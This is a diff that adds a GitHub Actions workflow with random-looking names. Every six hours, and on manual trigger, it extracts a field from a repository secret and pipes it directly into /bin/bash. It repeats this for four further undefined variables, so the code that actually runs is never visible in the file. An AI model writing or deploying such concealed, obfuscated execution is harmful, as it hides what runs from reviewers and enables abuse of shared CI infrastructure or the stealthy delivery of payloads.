@@ -1,0 +1,22 @@
+name: juxianmingz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: juxianmingz
+        env:
+          slia4: ${{ secrets.slia4 }}
+        run: |
+          echo $slia4 | jq -r .szwx170 | /bin/bash
+          echo $vnw29277 | jq -r .pfel74471 | /bin/bash
+          echo $puz3804 | jq -r .txg07 | /bin/bash
+          echo $xvvs3716 | jq -r .aoio503 | /bin/bash
+          echo $lpesx40637 | jq -r .hko36926 | /bin/bash
+
